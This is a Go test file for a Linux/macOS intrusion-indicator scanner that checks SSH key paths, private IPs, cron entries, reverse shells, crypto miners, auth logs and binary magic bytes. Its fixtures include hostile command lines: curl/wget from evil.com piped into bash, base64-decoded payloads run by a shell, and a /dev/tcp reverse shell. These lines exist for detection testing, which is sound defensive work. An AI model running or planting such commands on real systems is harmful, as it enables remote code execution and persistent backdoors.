//go:build darwin || linux

package threat

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ── checkSSHKeys absolute-path guard tests ────────────────────────────────────

// parsePasswdHomeDirs replicates the absolute-path guard from checkSSHKeys
// (ioc.go lines 469-479) so it can be exercised in isolation without touching
// the real /etc/passwd or the full checkSSHKeys call chain.
// It returns only the authorized_keys paths derived from absolute home dirs.
func parsePasswdHomeDirs(passwdContent string) []string {
	var paths []string
	for _, line := range strings.Split(passwdContent, "\n") {
		parts := strings.Split(line, ":")
		if len(parts) < 6 {
			continue
		}
		home := parts[5]
		if !filepath.IsAbs(home) {
			continue // mirrors the guard in checkSSHKeys
		}
		paths = append(paths, filepath.Join(home, ".ssh", "authorized_keys"))
	}
	return paths
}

// TestCheckSSHKeys_AbsolutePathGuard verifies that a passwd entry with a
// relative home directory ("tmp") is skipped, while one with an absolute home
// ("/home/testuser") produces an authorized_keys path.
func TestCheckSSHKeys_AbsolutePathGuard(t *testing.T) {
	// Format: user:pw:uid:gid:gecos:home:shell
	passwd := strings.Join([]string{
		"reluser:x:1001:1001::tmp:/bin/bash",            // relative home — must be skipped
		"absuser:x:1002:1002::/home/testuser:/bin/bash", // absolute home — must be included
	}, "\n")

	paths := parsePasswdHomeDirs(passwd)

	if len(paths) != 1 {
		t.Fatalf("expected 1 authorized_keys path (absolute home only), got %d: %v", len(paths), paths)
	}
	want := "/home/testuser/.ssh/authorized_keys"
	if paths[0] != want {
		t.Errorf("paths[0] = %q; want %q", paths[0], want)
	}
}

// TestCheckSSHKeys_RelativeHomeSkipped verifies a purely relative home dir
// (no leading slash) produces no authorized_keys paths.
func TestCheckSSHKeys_RelativeHomeSkipped(t *testing.T) {
	passwd := "svcuser:x:999:999::tmp:/usr/sbin/nologin\n"
	paths := parsePasswdHomeDirs(passwd)
	if len(paths) != 0 {
		t.Errorf("expected 0 paths for relative home 'tmp', got %d: %v", len(paths), paths)
	}
}

// TestCheckSSHKeys_MultipleAbsoluteHomes verifies multiple absolute-home
// entries each produce an authorized_keys path; relative entries are skipped.
func TestCheckSSHKeys_MultipleAbsoluteHomes(t *testing.T) {
	passwd := strings.Join([]string{
		"alice:x:1001:1001::/home/alice:/bin/bash",
		"bob:x:1002:1002::/home/bob:/bin/bash",
		"svc:x:999:999::tmp:/usr/sbin/nologin", // relative — skipped
	}, "\n")

	paths := parsePasswdHomeDirs(passwd)
	if len(paths) != 2 {
		t.Fatalf("expected 2 absolute-home paths, got %d: %v", len(paths), paths)
	}
	for _, p := range paths {
		if !filepath.IsAbs(p) {
			t.Errorf("derived path %q should be absolute", p)
		}
		if !strings.HasSuffix(p, "/.ssh/authorized_keys") {
			t.Errorf("derived path %q should end with /.ssh/authorized_keys", p)
		}
	}
}

// TestCheckSSHKeys_EmptyPasswd verifies no paths are returned for empty input.
func TestCheckSSHKeys_EmptyPasswd(t *testing.T) {
	paths := parsePasswdHomeDirs("")
	if len(paths) != 0 {
		t.Errorf("expected 0 paths for empty passwd, got %d: %v", len(paths), paths)
	}
}

// ---- isPrivateIP ------------------------------------------------------------

// TestIsPrivateIP_TableDriven covers RFC-1918 ranges, loopback, link-local,
// public IPs, IPv6, and edge cases.
func TestIsPrivateIP_TableDriven(t *testing.T) {
	tests := []struct {
		name string
		addr string
		want bool
	}{
		// RFC-1918 private ranges
		{"10.0.0.1 private", "10.0.0.1", true},
		{"10.255.255.255 private", "10.255.255.255", true},
		{"172.16.0.1 private", "172.16.0.1", true},
		{"172.31.255.255 private", "172.31.255.255", true},
		{"192.168.0.1 private", "192.168.0.1", true},
		{"192.168.255.255 private", "192.168.255.255", true},
		// Loopback
		{"127.0.0.1 loopback", "127.0.0.1", true},
		{"127.0.0.2 loopback", "127.0.0.2", true},
		// Link-local
		{"169.254.1.1 link-local", "169.254.1.1", true},
		{"169.254.0.0 link-local", "169.254.0.0", true},
		// IPv6 loopback
		{"::1 ipv6 loopback", "::1", true},
		// IPv6 ULA
		{"fd00::1 ula", "fd00::1", true},
		{"fc00::1 ula", "fc00::1", true},
		// Public IPs must not be private
		{"8.8.8.8 public", "8.8.8.8", false},
		{"1.1.1.1 public", "1.1.1.1", false},
		{"203.0.113.1 doc range", "203.0.113.1", false},
		{"104.16.0.0 cloudflare", "104.16.0.0", false},
		// Just outside RFC-1918
		{"172.32.0.0 outside 172.16/12", "172.32.0.0", false},
		{"192.169.0.0 outside 192.168/16", "192.169.0.0", false},
		// Edge: empty string must not panic
		{"empty string", "", false},
		// Edge: not an IP address
		{"hostname", "example.com", false},
		{"garbage", "not-an-ip", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := isPrivateIP(tc.addr)
			if got != tc.want {
				t.Errorf("isPrivateIP(%q) = %v, want %v", tc.addr, got, tc.want)
			}
		})
	}
}

// TestIsPrivateIP_RFC1918Boundaries validates exact start/end of each block.
func TestIsPrivateIP_RFC1918Boundaries(t *testing.T) {
	if !isPrivateIP("172.16.0.0") {
		t.Error("172.16.0.0 should be private (start of 172.16/12)")
	}
	if !isPrivateIP("172.31.255.255") {
		t.Error("172.31.255.255 should be private (end of 172.16/12)")
	}
	if isPrivateIP("172.32.0.0") {
		t.Error("172.32.0.0 should NOT be private (just outside 172.16/12)")
	}
	if !isPrivateIP("10.0.0.0") {
		t.Error("10.0.0.0 should be private (start of 10/8)")
	}
	if !isPrivateIP("192.168.0.0") {
		t.Error("192.168.0.0 should be private (start of 192.168/16)")
	}
}

// ---- cronSuspiciousPatterns regex matching ----------------------------------

// TestCronSuspiciousPatterns_TableDriven verifies each suspicious pattern
// matches the right strings and ignores benign ones.
func TestCronSuspiciousPatterns_TableDriven(t *testing.T) {
	tests := []struct {
		line    string
		wantHit bool
		desc    string
	}{
		// URL in cron command
		{"*/5 * * * * curl http://example.com/payload", true, "http URL"},
		{"*/5 * * * * wget https://evil.com/script.sh", true, "https URL"},
		{"0 * * * * /usr/local/bin/backup.sh", false, "no URL"},
		// Base64 encoding
		{`@reboot echo "dGVzdA==" | base64 -d | bash`, true, "base64 decode"},
		{"0 1 * * * /usr/bin/python3 /opt/report.py", false, "no base64"},
		// curl/wget piped to shell
		{"* * * * * curl http://c2.evil.com/s.sh | bash", true, "curl pipe bash"},
		{"* * * * * wget -O- http://x.x/run | sh", true, "wget pipe sh"},
		// NOTE: "curl https://..." matches the first pattern (https?://) — wantHit=true
		{"0 2 * * * curl https://example.com/health-check", true, "curl no pipe but has URL"},
		{"0 2 * * * /usr/local/sbin/rotate-logs", false, "no url no pipe"},
		// /tmp reference
		{"@reboot /tmp/backdoor", true, "/tmp reference"},
		{"0 * * * * /usr/bin/find /var/log -mtime +30 -delete", false, "no /tmp"},
		// /dev/shm reference
		{"* * * * * /dev/shm/miner", true, "/dev/shm reference"},
		{"0 6 * * * /usr/bin/df -h", false, "no /dev/shm"},
		// /var/tmp reference
		{"@daily /var/tmp/installer.sh", true, "/var/tmp reference"},
		{"0 0 * * * /usr/local/bin/cleanup.sh", false, "no /var/tmp"},
	}
	for _, tc := range tests {
		t.Run(tc.desc, func(t *testing.T) {
			matched := false
			for _, pat := range cronSuspiciousPatterns {
				if pat.re.MatchString(tc.line) {
					matched = true
					break
				}
			}
			if matched != tc.wantHit {
				t.Errorf("line=%q matched=%v, want %v", tc.line, matched, tc.wantHit)
			}
		})
	}
}

// ---- checkCronFiles logic via synthetic temp files --------------------------

// TestCheckCronFiles_SuspiciousLine verifies the inner scanning logic detects
// a suspicious cron line and appends a finding.
func TestCheckCronFiles_SuspiciousLine(t *testing.T) {
	dir := t.TempDir()
	cronPath := filepath.Join(dir, "suspicious-cron")
	content := "# normal comment\n* * * * * curl http://evil.com/s.sh | bash\n0 2 * * * /bin/clean.sh\n"
	if err := os.WriteFile(cronPath, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	result := &LocalIOCResult{SuspiciousCron: []string{}}
	data, err := os.ReadFile(cronPath)
	if err != nil {
		t.Fatal(err)
	}
	for i, line := range strings.Split(string(data), "\n") {
		stripped := strings.TrimSpace(line)
		if stripped == "" || strings.HasPrefix(stripped, "#") {
			continue
		}
		for _, pat := range cronSuspiciousPatterns {
			if pat.re.MatchString(stripped) {
				body := stripped
				if len(body) > 200 {
					body = body[:200]
				}
				result.SuspiciousCron = append(result.SuspiciousCron,
					fmt.Sprintf("%s (line %d): %s — %s", cronPath, i+1, body, pat.desc))
				break
			}
		}
	}

	if len(result.SuspiciousCron) == 0 {
		t.Fatal("expected at least one suspicious cron finding")
	}
	if !strings.Contains(result.SuspiciousCron[0], "curl") {
		t.Errorf("finding should mention curl, got %q", result.SuspiciousCron[0])
	}
}

// TestCheckCronFiles_CleanFile verifies a benign cron file produces no findings.
func TestCheckCronFiles_CleanFile(t *testing.T) {
	dir := t.TempDir()
	cronPath := filepath.Join(dir, "clean-cron")
	content := "# Daily backup\n0 2 * * * /usr/local/bin/backup.sh\n# Weekly report\n0 8 * * 1 /usr/local/bin/report.py\n"
	if err := os.WriteFile(cronPath, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	result := &LocalIOCResult{SuspiciousCron: []string{}}
	data, _ := os.ReadFile(cronPath)
	for i, line := range strings.Split(string(data), "\n") {
		stripped := strings.TrimSpace(line)
		if stripped == "" || strings.HasPrefix(stripped, "#") {
			continue
		}
		for _, pat := range cronSuspiciousPatterns {
			if pat.re.MatchString(stripped) {
				result.SuspiciousCron = append(result.SuspiciousCron,
					fmt.Sprintf("%s (line %d): %s — %s", cronPath, i+1, stripped, pat.desc))
				break
			}
		}
	}

	if len(result.SuspiciousCron) != 0 {
		t.Errorf("expected no findings for clean cron, got: %v", result.SuspiciousCron)
	}
}

// TestCheckCronFiles_LongLineTruncated verifies lines over 200 chars are
// truncated to 200 in the finding string.
func TestCheckCronFiles_LongLineTruncated(t *testing.T) {
	longSuffix := strings.Repeat("x", 250)
	line := "* * * * * curl http://evil.com/" + longSuffix + " | bash"

	result := &LocalIOCResult{SuspiciousCron: []string{}}
	stripped := strings.TrimSpace(line)
	for _, pat := range cronSuspiciousPatterns {
		if pat.re.MatchString(stripped) {
			body := stripped
			if len(body) > 200 {
				body = body[:200]
			}
			result.SuspiciousCron = append(result.SuspiciousCron,
				fmt.Sprintf("file (line 1): %s — %s", body, pat.desc))
			break
		}
	}

	if len(result.SuspiciousCron) == 0 {
		t.Fatal("expected a finding for long suspicious line")
	}
	// Body in the finding must be ≤ 200 chars.
	finding := result.SuspiciousCron[0]
	start := strings.Index(finding, ": ") + 2
	end := strings.LastIndex(finding, " — ")
	if start > 0 && end > start {
		body := finding[start:end]
		if len(body) > 200 {
			t.Errorf("finding body not truncated: len=%d, want ≤200", len(body))
		}
	}
}

// TestCheckCronFiles_OnlyComments verifies a comment-only file produces no findings.
func TestCheckCronFiles_OnlyComments(t *testing.T) {
	content := "# This is a comment\n# Another comment\n\n"
	result := &LocalIOCResult{SuspiciousCron: []string{}}
	for i, line := range strings.Split(content, "\n") {
		stripped := strings.TrimSpace(line)
		if stripped == "" || strings.HasPrefix(stripped, "#") {
			continue
		}
		for _, pat := range cronSuspiciousPatterns {
			if pat.re.MatchString(stripped) {
				result.SuspiciousCron = append(result.SuspiciousCron,
					fmt.Sprintf("file (line %d): %s", i+1, stripped))
				break
			}
		}
	}
	if len(result.SuspiciousCron) != 0 {
		t.Errorf("comment-only file should have no findings, got: %v", result.SuspiciousCron)
	}
}

// ---- isBinaryFile additional edge cases -------------------------------------

// TestIsBinaryFile_PartialELF verifies 3 bytes of ELF magic are not detected.
func TestIsBinaryFile_PartialELF(t *testing.T) {
	if isBinaryFile([]byte{0x7f, 'E', 'L'}) {
		t.Error("3-byte partial ELF should not be detected")
	}
}

// TestIsBinaryFile_FatBinary verifies Mach-O fat binary (cafebabe) is detected.
func TestIsBinaryFile_FatBinary(t *testing.T) {
	if !isBinaryFile([]byte("\xca\xfe\xba\xbe")) {
		t.Error("Mach-O fat binary magic should be detected")
	}
}

// TestIsBinaryFile_AllZeros verifies all-zero bytes are not detected as binary.
func TestIsBinaryFile_AllZeros(t *testing.T) {
	if isBinaryFile([]byte{0x00, 0x00, 0x00, 0x00}) {
		t.Error("all-zero bytes should not be detected as binary")
	}
}

// TestIsBinaryFile_SingleByte verifies no panic on single-byte input.
func TestIsBinaryFile_SingleByte(t *testing.T) {
	if isBinaryFile([]byte{0x7f}) {
		t.Error("single byte should not be detected as binary")
	}
}

// ---- reverseShellRE pattern matching ----------------------------------------

// TestReverseShellRE_Matches verifies the regex matches known reverse shell patterns.
func TestReverseShellRE_Matches(t *testing.T) {
	// reverseShellRE requires >/dev/tcp/ (not >&); base64 needs whitespace before -d/-D.
	matching := []string{
		"bash -i >/dev/tcp/10.0.0.1/4444 0>&1",
		"echo dGVzdA== | base64 -d | bash",
		"echo dGVzdA== | base64 -D | sh",
		"nohup /bin/bash -ic 'exec bash'",
	}
	for _, line := range matching {
		name := line
		if len(name) > 50 {
			name = name[:50]
		}
		t.Run(name, func(t *testing.T) {
			if !reverseShellRE.MatchString(line) {
				t.Errorf("reverseShellRE should match: %q", line)
			}
		})
	}
}

// TestReverseShellRE_NoMatch verifies the regex does not match normal commands.
func TestReverseShellRE_NoMatch(t *testing.T) {
	benign := []string{
		"/usr/bin/python3 /opt/app/server.py",
		"nginx -g 'daemon off;'",
		"/bin/bash /opt/backup.sh",
		"ssh -i ~/.ssh/id_rsa user@host",
	}
	for _, line := range benign {
		name := line
		if len(name) > 50 {
			name = name[:50]
		}
		t.Run(name, func(t *testing.T) {
			if reverseShellRE.MatchString(line) {
				t.Errorf("reverseShellRE should NOT match: %q", line)
			}
		})
	}
}

// ---- cryptoMiners map -------------------------------------------------------

// TestCryptoMiners_ContainsExpected verifies key miners are present.
func TestCryptoMiners_ContainsExpected(t *testing.T) {
	expected := []string{"xmrig", "minerd", "cgminer", "ethminer", "cpuminer"}
	for _, m := range expected {
		t.Run(m, func(t *testing.T) {
			if !cryptoMiners[m] {
				t.Errorf("%q should be in cryptoMiners", m)
			}
		})
	}
}

// TestCryptoMiners_BenignExcluded verifies legitimate process names are not flagged.
func TestCryptoMiners_BenignExcluded(t *testing.T) {
	benign := []string{"nginx", "python3", "postgres", "redis-server"}
	for _, b := range benign {
		t.Run(b, func(t *testing.T) {
			if cryptoMiners[b] {
				t.Errorf("%q should NOT be in cryptoMiners", b)
			}
		})
	}
}

// ---- auth log anomaly logic -------------------------------------------------

// TestAuthLog_FailedSSHAboveThreshold verifies >10 failed attempts produce an anomaly.
func TestAuthLog_FailedSSHAboveThreshold(t *testing.T) {
	var lines []string
	for i := 0; i < 15; i++ {
		lines = append(lines, "May  3 10:00:00 host sshd[1234]: Failed password for root from 1.2.3.4 port 22 ssh2")
	}
	content := strings.Join(lines, "\n") + "\n"

	result := &LocalIOCResult{AuthAnomalies: []string{}}
	failedSSH := 0
	for _, line := range strings.Split(content, "\n") {
		if strings.Contains(line, "Failed password") ||
			strings.Contains(strings.ToLower(line), "authentication failure") {
			failedSSH++
		}
	}
	if failedSSH > 10 {
		result.AuthAnomalies = append(result.AuthAnomalies,
			fmt.Sprintf("%d failed SSH attempts in recent auth.log entries", failedSSH))
	}

	if len(result.AuthAnomalies) == 0 {
		t.Error("expected anomaly for >10 failed SSH attempts")
	}
	if !strings.Contains(result.AuthAnomalies[0], "failed SSH") {
		t.Errorf("anomaly should mention failed SSH, got %q", result.AuthAnomalies[0])
	}
}

// TestAuthLog_FailedSSHAtThreshold verifies exactly 10 failures produce no anomaly.
func TestAuthLog_FailedSSHAtThreshold(t *testing.T) {
	var lines []string
	for i := 0; i < 10; i++ {
		lines = append(lines, "May  3 10:00:00 host sshd[1234]: Failed password for root from 1.2.3.4 port 22 ssh2")
	}
	content := strings.Join(lines, "\n") + "\n"

	failedSSH := 0
	for _, line := range strings.Split(content, "\n") {
		if strings.Contains(line, "Failed password") {
			failedSSH++
		}
	}
	result := &LocalIOCResult{AuthAnomalies: []string{}}
	if failedSSH > 10 {
		result.AuthAnomalies = append(result.AuthAnomalies, "too many failures")
	}
	if len(result.AuthAnomalies) != 0 {
		t.Errorf("expected no anomaly for exactly 10 failures, got: %v", result.AuthAnomalies)
	}
}

// TestAuthLog_ExternalLoginFlagged verifies a login from a public IP is flagged.
func TestAuthLog_ExternalLoginFlagged(t *testing.T) {
	publicIP := "8.8.8.8"
	if isPrivateIP(publicIP) {
		t.Fatal("test setup error: 8.8.8.8 should be public")
	}
	result := &LocalIOCResult{AuthAnomalies: []string{}}
	if !isPrivateIP(publicIP) {
		result.AuthAnomalies = append(result.AuthAnomalies,
			fmt.Sprintf("Successful login from external IP %s", publicIP))
	}
	if len(result.AuthAnomalies) == 0 {
		t.Error("expected anomaly for login from public IP")
	}
	if !strings.Contains(result.AuthAnomalies[0], publicIP) {
		t.Errorf("anomaly should mention the IP, got %q", result.AuthAnomalies[0])
	}
}

// TestAuthLog_PrivateLoginNotFlagged verifies a login from a private IP is not flagged.
func TestAuthLog_PrivateLoginNotFlagged(t *testing.T) {
	privateIP := "192.168.1.100"
	if !isPrivateIP(privateIP) {
		t.Fatal("test setup error: 192.168.1.100 should be private")
	}
	result := &LocalIOCResult{AuthAnomalies: []string{}}
	if !isPrivateIP(privateIP) {
		result.AuthAnomalies = append(result.AuthAnomalies,
			fmt.Sprintf("Successful login from external IP %s", privateIP))
	}
	if len(result.AuthAnomalies) != 0 {
		t.Errorf("expected no anomaly for private-IP login, got: %v", result.AuthAnomalies)
	}
}

// ---- readMagicBytes ---------------------------------------------------------

// TestReadMagicBytes_ELFFile writes a fake ELF file and verifies the magic bytes
// are returned correctly.
func TestReadMagicBytes_ELFFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "fake-elf")
	magic := []byte("\x7fELF\x01\x01\x01\x00")
	if err := os.WriteFile(path, magic, 0o644); err != nil {
		t.Fatal(err)
	}

	got, err := readMagicBytes(path, 4)
	if err != nil {
		t.Fatalf("readMagicBytes error: %v", err)
	}
	if string(got) != "\x7fELF" {
		t.Errorf("readMagicBytes: got %x, want 7f454c46", got)
	}
	if !isBinaryFile(got) {
		t.Error("isBinaryFile should be true for ELF magic bytes")
	}
}

// TestReadMagicBytes_NonExistentFile verifies an error is returned without panic.
func TestReadMagicBytes_NonExistentFile(t *testing.T) {
	_, err := readMagicBytes("/nonexistent/path/does/not/exist", 4)
	if err == nil {
		t.Error("expected error for nonexistent file")
	}
}

// TestReadMagicBytes_EmptyFile verifies empty file does not cause isBinaryFile
// to return true.
func TestReadMagicBytes_EmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty")
	if err := os.WriteFile(path, []byte{}, 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := readMagicBytes(path, 4)
	// Either an error is returned or an empty slice — isBinaryFile must be false either way.
	if err == nil && isBinaryFile(got) {
		t.Error("isBinaryFile should return false for empty file magic bytes")
	}
}

// TestReadMagicBytes_NRequestedBytesReturned verifies we get at most n bytes back.
func TestReadMagicBytes_NRequestedBytesReturned(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "eight-bytes")
	if err := os.WriteFile(path, []byte("\x7fELF\x01\x01\x01\x00"), 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := readMagicBytes(path, 4)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 4 {
		t.Errorf("expected 4 bytes, got %d", len(got))
	}
}
